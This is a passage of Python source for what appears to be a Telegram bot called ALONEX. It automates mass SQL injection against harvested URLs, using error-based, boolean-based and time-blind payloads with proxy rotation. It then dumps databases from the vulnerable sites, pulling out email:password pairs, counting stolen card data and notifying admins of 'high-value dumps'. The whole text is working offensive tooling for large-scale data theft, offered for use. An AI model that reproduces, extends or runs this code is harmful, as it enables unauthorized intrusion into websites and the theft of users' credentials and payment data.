                    t,st=await a_get_fb(s,build_url(parsed,nq),to=to,proxy=proxy)
                    if st in (403,429): continue
                    if not t: continue
                    low=t.lower()
                    m=re.search(r"~([a-z0-9._\- ]{3,60})~",low)
                    if m and re.search(r"\d",m.group(1)): return {"url":url,"param":param,"payload":vv,"sig":"error-echo:"+m.group(1),"conf":3,"db":dbfam("",vv)}
                    hit=None
                    for sig in ERROR_SIGS:
                        if sig in low: hit=sig; break
                    if hit:
                        if base_c is None:
                            bt,_=await a_get_fb(s,url,to=to,proxy=proxy); base_c=(bt or "").lower()
                        if hit not in base_c: return {"url":url,"param":param,"payload":vv,"sig":hit,"conf":3,"db":dbfam(hit,vv)}
                    break
            if pi==0 and orig:
                bt,_=await a_get_fb(s,url,to=to,proxy=proxy)
                if bt:
                    l0=len(bt)
                    nq1=query.copy(); nq1[param]=[orig+"' AND '1'='1"]
                    nq2=query.copy(); nq2[param]=[orig+"' AND '1'='2"]
                    t1,_=await a_get_fb(s,build_url(parsed,nq1),to=to,proxy=proxy)
                    t2,_=await a_get_fb(s,build_url(parsed,nq2),to=to,proxy=proxy)
                    t3,_=await a_get_fb(s,build_url(parsed,nq2),to=to,proxy=proxy)
                    if t1 and t2 and t3:
                        l1,l2,l3=len(t1),len(t2),len(t3)
                        if abs(l2-l3)<=max(10,int(l2*0.02)) and abs(l1-l2)>=max(150,int(l1*0.2)) and abs(l1-l0)<=max(60,int(l0*0.05)):
                            return {"url":url,"param":param,"payload":"boolean-based","sig":"boolean-stable","conf":2,"db":"blind"}
                if tb:
                    base_t=[]
                    for _ in range(2):
                        t0b=time.time(); await a_get_fb(s,url,to=to+6,proxy=proxy); base_t.append(time.time()-t0b)
                    avg=sum(base_t)/2
                    for tpay,tdb in TIME_PAY:
                        nq=query.copy(); nq[param]=[orig+tpay]
                        t0b=time.time(); t,_=await a_get_fb(s,build_url(parsed,nq),to=to+10,proxy=proxy); dt=time.time()-t0b
                        if t is not None and dt>avg+4:
                            return {"url":url,"param":param,"payload":tpay,"sig":"time-based","conf":2,"db":tdb}
        return None
    except: return None

def turbo_inject(cid, uid, mid, jid, urls, mode, threads=15):
    try:
        jp_reg(jid, "inject", uid, cid, {"threads": threads})
        try:
            save_json(os.path.join(JOBS_DATA, jid + ".urls"), urls)
        except:
            pass

        vuln = []
        nonev = []
        done = [0]
        last = [0.0]
        details = []
        reqs = [0]
        wafed = [0]
        dbst = {}
        t0 = time.time()
        since_save = [0]
        LIVE[jid] = {"kind": "inject", "vuln": vuln, "nonev": nonev}

        # 🔥 SMART PROXY ROTATION
        proxy_pool = hprox(uid)
        proxy_idx = [0]

        def next_proxy():
            if not proxy_pool:
                return None
            px = proxy_pool[proxy_idx[0] % len(proxy_pool)]
            proxy_idx[0] += 1
            return px

        bump("inject")
        bumpU(uid, "inject")
        vc = load_json(VULN_CACHE, {})
        now = time.time()
        to_test = []
        to = min(max(mode["timeout"], 6), 10)
        tb = mode.get("timeout", 0) >= 12

        for u in urls:
            e = vc.get(u)
            if e and e.get("sv") == SCAN_V and now - e.get("t", 0) < 7 * 86400:
                if e.get("v"):
                    vuln.append({"url": u})
                else:
                    nonev.append(u)
                done[0] += 1
            else:
                to_test.append(u)

        tb_txt = " | ⏰ TIME-BLIND" if tb else ""
        try:
            bot.edit_message_text(
                f"<blockquote><b>{E['syringe']} ALONEINJECTOR V3\n{LINE}\n🩸 TOTAL URLS: {len(urls)} | ⚡ FRESH: {len(to_test)} | 📦 CACHED: {len(urls)-len(to_test)}\n🛡️ PROXIES: {len(proxy_pool)} | {E['gear']} THREADS: {threads} | ⏱ {to}S{tb_txt}\n🗄️ MYSQL•MARIADB•PG•MSSQL•ORACLE•SQLITE</b></blockquote>",
                chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML"
            )
        except:
            pass

        HSEM = {}

        async def run():
            conn = aiohttp.TCPConnector(limit=threads + 10, limit_per_host=20, ssl=False, ttl_dns_cache=300, enable_cleanup_closed=True)
            async with aiohttp.ClientSession(connector=conn, headers=HDR, timeout=aiohttp.ClientTimeout(total=to)) as s:
                sem = asyncio.Semaphore(threads)

                def hsem(h):
                    if h not in HSEM:
                        HSEM[h] = asyncio.Semaphore(2)
                    return HSEM[h]

                async def task(u):
                    async with sem:
                        reqs[0] += 1
                        px = next_proxy()
                        async with hsem(urlparse(u).netloc):
                            return await a_scan(s, u, to, tb, proxy=px)

                for i in range(0, len(to_test), INJ_BATCH):
                    if stopped(jid):
                        break
                    batch = to_test[i:i + INJ_BATCH]
                    res = await asyncio.gather(*[task(u) for u in batch], return_exceptions=True)
                    for u, r in zip(batch, res):
                        if isinstance(r, dict) and r.get("waf"):
                            wafed[0] += 1
                            nonev.append(u)
                            vc[u] = {"v": 0, "t": now, "sv": SCAN_V}
                        elif isinstance(r, dict) and r:
                            vuln.append(r)
                            details.append(r)
                            vc[u] = {"v": 1, "t": now, "sv": SCAN_V}
                            dbst[r.get("db", "?")] = dbst.get(r.get("db", "?"), 0) + 1
                        else:
                            nonev.append(u)
                            vc[u] = {"v": 0, "t": now, "sv": SCAN_V}
                    done[0] += len(batch)
                    since_save[0] += len(batch)
                    if since_save[0] >= 2000:
                        save_json(VULN_CACHE, vc)
                        since_save[0] = 0
                    now2 = time.time()
                    if now2 - last[0] > 2:
                        last[0] = now2
                        rps = round(reqs[0] / max(1, now2 - t0), 1)
                        dbs = " ".join(f"{k}:{v}" for k, v in sorted(dbst.items(), key=lambda x: -x[1]))
                        try:
                            total_batches = (len(to_test) + INJ_BATCH - 1) // INJ_BATCH
                            current_batch = i // INJ_BATCH + 1
                            bot.edit_message_text(
                                f"<blockquote><b>{E['syringe']} ALONEINJECTOR V3\n{LINE}\n{bar(done[0],len(urls))} {pct(done[0],len(urls))}%\n{E['blood']} VULN: {len(vuln)} | {E['shield']} SAFE: {len(nonev)} | 🧱 WAF: {wafed[0]}\n🛡️ PROXIES: {len(proxy_pool)} | 🔄 ROTATIONS: {proxy_idx[0]}\n🗄️ {dbs or '—'}\n{E['zap']} {rps} R/S | {E['gear']} {threads} THREADS\n📊 BATCH: {current_batch}/{total_batches} | TOTAL: {done[0]}/{len(urls)} | LEFT: {len(urls)-done[0]}</b></blockquote>",
                                chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML"
                            )
                        except:
                            pass

        _run_on_loop(run())
        if len(vc) > 20000:
            vc = dict(sorted(vc.items(), key=lambda kv: -kv[1].get("t", 0))[:10000])
        save_json(VULN_CACHE, vc)
        clear_markup(cid, mid)
        jp_unreg(jid)
        if stopped(jid):
            LIVE.pop(jid, None)
            return

        vurls = [v["url"] for v in vuln]
        if vurls:
            send_doc(cid, ("\n".join(vurls) + "\n").encode(), "vulnerable_urls.txt", uid)
        if nonev:
            send_doc(cid, ("\n".join(nonev) + "\n").encode(), "none_vulnerable_urls.txt", uid)
        if details:
            det = "\n".join(
                f"URL: {d['url']}\nPARAM: {d['param']} | DB: {d.get('db','?')}\nPAYLOAD: {d['payload']}\nSIG: {d['sig']} | CONF: {d.get('conf',2)}\n{'-'*40}"
                for d in details
            )
            send_doc(cid, (det + "\n").encode(), "vuln_details.txt", uid)
            send_doc(cid, html_report("Vulnerability Report", details).encode(), "report.html", uid)

        if vurls:
            LAST.setdefault(uid, {})["vuln"] = vurls
            dbs = " | ".join(f"{k}×{v}" for k, v in sorted(dbst.items(), key=lambda x: -x[1]))
            mk = types.InlineKeyboardMarkup()
            mk.add(sbtn("SEND TO DUMPER", "pipe:data", "danger"))
            status_txt = "[PARTIAL]" if stopped(jid) else "COMPLETED"
            bot.send_message(
                cid,
                f"<blockquote><b>{E['tick']} INJECTOR {status_txt}\n{LINE}\n{E['blood']} VULN: {len(vuln)} | {E['shield']} SAFE: {len(nonev)} | 🧱 WAF: {wafed[0]}\n🛡️ PROXIES: {len(proxy_pool)}\n🗄️ {dbs or '—'}</b></blockquote>",
                reply_markup=mk, parse_mode="HTML"
            )
        else:
            bot.send_message(
                cid,
                f"<blockquote><b>{E['cross']} INJECTOR COMPLETED\n{LINE}\n{E['blood']} VULN: 0 | {E['shield']} SAFE: {len(nonev)} | 🧱 WAF: {wafed[0]}\n{E['search']} {done[0]}/{len(urls)} TESTED</b></blockquote>",
                parse_mode="HTML"
            )
    except Exception as e:
        try:
            bot.send_message(cid, f"<blockquote><b>{E['cross']} INJECT BUG:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
        except:
            pass

def sane_idlist(s,max_tok=400):
    toks=[t.strip() for t in s.split(",") if t.strip()]
    if not toks or len(toks)>max_tok: return False
    ok=sum(1 for t in toks if re.match(r"^[A-Za-z0-9_$]+$",t) and len(t)<=64)
    return ok>=max(1,int(len(toks)*0.8))

def extract_db(db,t):
    for rx in EXTRACT[db]:
        m=re.search(rx,t,re.I)
        if m:
            d=m.group(1).strip()
            if len(d)>300: continue
            if re.search(r"[<>={}();\"']",d): continue
            if not (re.search(r"[A-Za-z]",d) or re.search(r"\d+\.\d+",d)): continue
            return d
    return None

def sqli_fetch(url,param,query,db,ph,to,strict=False):
    parsed=urlparse(url); bq=parse_qs(parsed.query,keep_blank_values=True)
    for f in WRAP[db]:
        nq=bq.copy(); nq[param]=[f(query)]
        t,s=_get(build_url(parsed,nq),ph,to)
        if t:
            d=extract_db(db,t)
            if d:
                if strict and not re.search(r"\d",d): continue
                return d
    return None

def q_dbs(db):
    return {"mysql":"select group_concat(schema_name) from information_schema.schemata","mssql":"select string_agg(name, ',') from sys.databases","pg":"select string_agg(datname, ',') from pg_database","oracle":"select listagg(username, ',') within group (order by username) from (select username from all_users where rownum<=50)"}[db]
SYSDB=["information_schema","mysql","performance_schema","sys","pg_catalog","pg_toast","master","tempdb","model","msdb"]

def q_tables(db,dbname=None):
    if db=="mysql" and dbname: return "select group_concat(table_name) from information_schema.tables where table_schema='"+esc(dbname)+"'"
    return {"mysql":"select group_concat(table_name) from information_schema.tables where table_schema=database()","mssql":"select string_agg(name, ',') from sys.tables","pg":"select string_agg(table_name, ',') from information_schema.tables where table_schema='public'","oracle":"select listagg(table_name, ',') within group (order by table_name) from user_tables"}[db]

def q_cols(db,t):
    if db=="mysql": return "select group_concat(column_name) from information_schema.columns where table_name="+hexify(t)
    if db=="mssql": return "select string_agg(column_name, ',') from information_schema.columns where table_name='"+esc(t)+"'"
    if db=="pg": return "select string_agg(column_name, ',') from information_schema.columns where table_name='"+esc(t)+"'"
    return "select listagg(column_name, ',') within group (order by column_name) from user_tab_columns where table_name='"+esc(t)+"'"

def dump_one_url(url,ph,mode,juicy,jid):
    try:
        if stopped(jid): return None
        t_start=time.time()
        parsed=urlparse(url); query=parse_qs(parsed.query,keep_blank_values=True)
        if not query: return None
        param=None; db=None; ver=None
        for p in list(query.keys())[:3]:
            for d in VQ:
                v=sqli_fetch(url,p,VQ[d],d,ph,mode["timeout"],True)
                if v: param,db,ver=p,d,v; break
            if param: break
        if not param: return None
        res={"url":url,"db":db,"info":{"version":ver},"tables":{},"creds":[]}
        dbscsv=sqli_fetch(url,param,q_dbs(db),db,ph,mode["timeout"])
        dbs=[x for x in (dbscsv or "").split(",") if x and x.strip().lower() not in SYSDB] if dbscsv else []
        if not dbs: dbs=[None]
        total=0
        for dbname in dbs[:6]:
            if stopped(jid) or time.time()-t_start>DUMP_DEADLINE: break
            tcsv=sqli_fetch(url,param,q_tables(db,dbname),db,ph,mode["timeout"])
            if not tcsv or not sane_idlist(tcsv): continue
            tables=[t for t in tcsv.split(",") if t]
            total+=len(tables)
            if juicy: tables=[t for t in tables if any(k in t.lower() for k in JUICY)] or tables
            for t in tables[:mode["tables"]]:
                if stopped(jid) or time.time()-t_start>DUMP_DEADLINE: break
                ccsv=sqli_fetch(url,param,q_cols(db,t),db,ph,mode["timeout"])
                if not ccsv or not sane_idlist(ccsv): continue
                cols=sort_cols([c for c in ccsv.split(",") if c])
                if not cols: continue
                res["tables"][t]={"columns":cols,"rows":q_rows_chunk(db,t,cols,mode["rows"],ph,mode["timeout"],url,param)}
                if db=="mysql":
                    mailc=next((c for c in cols if any(k in c.lower() for k in MAILK)),None)
                    passc=next((c for c in cols if any(k in c.lower() for k in PASSK)),None)
                    if mailc and passc:
                        cq="select group_concat(concat_ws(0x3a,"+mailc+","+passc+") separator 0x7c) from `"+t+"` limit 1000"
                        cr=sqli_fetch(url,param,cq,db,ph,mode["timeout"])
                        if cr: res["creds"].extend([x.strip() for x in cr.split("|") if ":" in x and len(x)<200])
        res["info"]["total_tables"]=str(total)
        return res
    except: return None

DUMP_CACHE=P("dump_cache.json")

def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
    try:
        jp_reg(jid,"dump",uid,cid,{"juicy":juicy})
        try: save_json(os.path.join(JOBS_DATA,jid+".urls"),urls)
        except: pass
        t_start = time.time()
        proxy_pool_dump = uprox(uid)
        proxy_rotations_dump = [0]
        ph=PH(uprox(uid)); dumps=[]; done=[0]; last=[0.0]; cur=["-"]; cached=[0]
        LIVE[jid]={"kind":"dump","dumps":dumps}
        bump("dump"); bumpU(uid,"dump")
        dc=load_json(DUMP_CACHE,{}); now=time.time(); to_dump=[]
        for u in urls:
            if dc.get(u) and now-dc[u]<7*86400: cached[0]+=1
            else: to_dump.append(u)
            
        def edit(force=False):
            now=time.time()
            if force or now-last[0]>20:
                last[0]=now
                t_elapsed = max(1, now - t_start)
                speed = round(done[0] / (t_elapsed / 60), 1) if done[0] else 0
                eta_txt = eta_line(t_start, done[0], len(to_dump))
                creds_total = sum(len(d.get("creds",[])) for d in dumps)
                cc_total = sum(len(d.get("cards",[])) for d in dumps)
                try: bot.edit_message_text(f"<blockquote><b>{E['blood']} ALONEDUMPER V2\n{LINE}\n{bar(done[0],len(to_dump))} {pct(done[0],len(to_dump))}%\n📁 SITES DUMPED: {len(dumps)} | 🔐 CREDS: {creds_total} | 💳 CC: {cc_total}\n🛡️ PROXIES: {len(proxy_pool_dump)} | 🔄 ROT: {proxy_rotations_dump[0]}\n⚡ {speed} sites/min | ⚙️ {min(DUMP_WORKERS,mode['workers'])} WORKERS\n📊 TOTAL: {done[0]}/{len(to_dump)} sites | LEFT: {len(to_dump)-done[0]}\n{eta_txt}\nCUR: {cur[0][:20]}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
                except: pass
                
        def on_done(f,u):
            cur[0]=urlparse(u).netloc[:25]
            r=f.result()
            if r and (r.get("tables") or r.get("info")): dumps.append(r)
            dc[u]=now
            done[0]+=1; edit()
            
        run_jobs(lambda u:dump_one_url(u,ph,mode,juicy,jid),to_dump,jid,min(DUMP_WORKERS,mode["workers"]),on_done)
        if len(dc)>20000: dc=dict(sorted(dc.items(),key=lambda kv:-kv[1])[:10000])
        save_json(DUMP_CACHE,dc)
        clear_markup(cid,mid); edit(True); jp_unreg(jid)
        if stopped(jid):
            save_json(DUMP_CACHE,dc); clear_markup(cid,mid); jp_unreg(jid)
            threading.Thread(target=_partial_sender,args=(jid,cid),daemon=True).start()
            LIVE.pop(jid,None); return
            
        juicy_found=[]
        for dmp in dumps:
            for tn in dmp["tables"]:
                if any(k in tn.lower() for k in JUICY): juicy_found.append(f"{urlparse(dmp['url']).netloc} → {tn}")
        em,ha=count_loot(dumps)
        
        if juicy_found or em:
            for a in admins():
                try: bot.send_message(a, f"<blockquote><b>{E['warn']} HIGH-VALUE DUMP DETECTED\n{LINE}\n{E['user']} UID: {uid}\n{E['globe']} EMAILS/CREDS: {em} | {E['lock']} HASHES: {ha}\n" + "\n".join(juicy_found[:10]) + "</b></blockquote>", parse_mode="HTML")
                except: pass
                
        if dumps:
            send_doc(cid,build_zip(dumps),"data_dump.zip",uid)
            rows=[{"url":d["url"],"type":"DB-DUMP "+d.get("db","?"),"param":",".join(d["tables"].keys()),"sig":str(sum(len(t["rows"]) for t in d["tables"].values()))+" rows"} for d in dumps]
            send_doc(cid,html_report("Dump Report",rows).encode(),"dump_report.html",uid)
            bot.send_message(cid, f"<blockquote><b>{E['tick']} DUMPER COMPLETED\n{LINE}\n{E['folder']} SITES: {len(dumps)} | {E['chart']} TABLES: {sum(len(d['tables']) for d in dumps)}\n{E['globe']} EMAILS/CREDS: {em} | {E['lock']} HASHES: {ha}\n{E['zap']} {cached[0]} CACHED SKIPS</b></blockquote>", parse_mode="HTML")
        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} NO NEW DATA EXTRACTED.\n{E['zap']} {cached[0]} CACHED SKIPS.</b></blockquote>", parse_mode="HTML")
    except Exception as e:
        try: bot.send_message(cid, f"<blockquote><b>{E['cross']} DUMPER ERROR:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
        except: pass


def _resume_auto():
    time.sleep(12)
    d=load_json(AUTO_FILE,{})
    for u,v in d.items():
        try:
            if v.get("done",0)<v.get("limit",0):
                try: bot.send_message(int(u), f"<blockquote><b>{E['robot']} SYSTEM RESTARTED — RESUMING AUTO PILOT!</b></blockquote>", parse_mode="HTML")
                except: pass
                threading.Thread(target=auto_loop,args=(int(u),int(u),v["limit"])).start()
        except: pass
    try: bot.send_message(OWNER_ID, f"<blockquote><b>{E['skull']} ALONEX ONLINE — RESUME PROTOCOL ACTIVE.</b></blockquote>", parse_mode="HTML")
    except: pass

if __name__=="__main__":
    print("💀 ALONEX — VIP PREMIUM EDITION STARTING...")
    
    if "check_resources" in globals():
        try: check_resources()
        except: pass
        
    if "job_cleanup_loop" in globals():
        threading.Thread(target=job_cleanup_loop,daemon=True).start()
        
    threading.Thread(target=sched_loop,daemon=True).start()
    
    def _resume_all():
        time.sleep(15)
        ad=load_json(AUTO_FILE,{})
        for u,v in ad.items():
            try:
                if v.get("done",0)<v.get("limit",0):
                    bot.send_message(int(u), f"<blockquote><b>{E['robot']} BOT RESTARTED — RESUMING AUTO PILOT!</b></blockquote>", parse_mode="HTML")
                    threading.Thread(target=auto_loop,args=(int(u),int(u),v["limit"],v["done"])).start()
            except: pass
            
        for jid,e in list(jp_load().items()):
            try:
                uid=int(e["uid"]); cid=int(e["cid"]); kind=e["kind"]; meta=e.get("meta",{})
                mode=get_mode(uid)
                
                if kind=="parse":
                    dorks=load_json(os.path.join(JOBS_DATA,jid+".dorks"),[])
                    if not dorks: jp_unreg(jid); continue
                    bot.send_message(cid, f"<blockquote><b>{E['globe']} CRASH RECOVERY: RESUMING PARSER (FROM LAST STATE)</b></blockquote>", parse_mode="HTML")
                    msg=bot.send_message(cid, f"<blockquote><b>{E['zap']} RESUMING PROCESS...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
                    threading.Thread(target=turbo_parse,args=(cid,uid,msg.message_id,jid,dorks,meta.get("engines",["ddg","bing"]),meta.get("fresh",""),mode,meta.get("threads",15),meta.get("pages",1),meta.get("workers",40))).start()
                
                elif kind=="inject":
                    urls=load_json(os.path.join(JOBS_DATA,jid+".urls"),[])
                    if not urls: jp_unreg(jid); continue
                    bot.send_message(cid, f"<blockquote><b>{E['syringe']} CRASH RECOVERY: RESUMING INJECTOR (SKIPPING CACHED URLS)</b></blockquote>", parse_mode="HTML")
                    msg=bot.send_message(cid, f"<blockquote><b>{E['zap']} RESUMING PROCESS...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
                    threading.Thread(target=turbo_inject,args=(cid,uid,msg.message_id,jid,urls,mode,meta.get("threads",15))).start()
                
                elif kind=="dump":
                    urls=load_json(os.path.join(JOBS_DATA,jid+".urls"),[])
                    if not urls: jp_unreg(jid); continue
                    bot.send_message(cid, f"<blockquote><b>{E['blood']} CRASH RECOVERY: RESUMING DUMPER (SKIPPING CACHED SITES)</b></blockquote>", parse_mode="HTML")
                    msg=bot.send_message(cid, f"<blockquote><b>{E['zap']} RESUMING PROCESS...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
                    threading.Thread(target=run_datadump,args=(cid,uid,msg.message_id,jid,urls,None,mode,meta.get("juicy",False))).start()
            except: pass
            
    threading.Thread(target=_resume_all,daemon=True).start()
    
    while True:
        try: 
            bot.infinity_polling(timeout=30)
        except KeyboardInterrupt: 
            print("🛑 ALONESTOPPED.")
            break
        except Exception as e: 
            print("⚠️ RESTARTING DUE TO ERROR:", e)
            time.sleep(5)
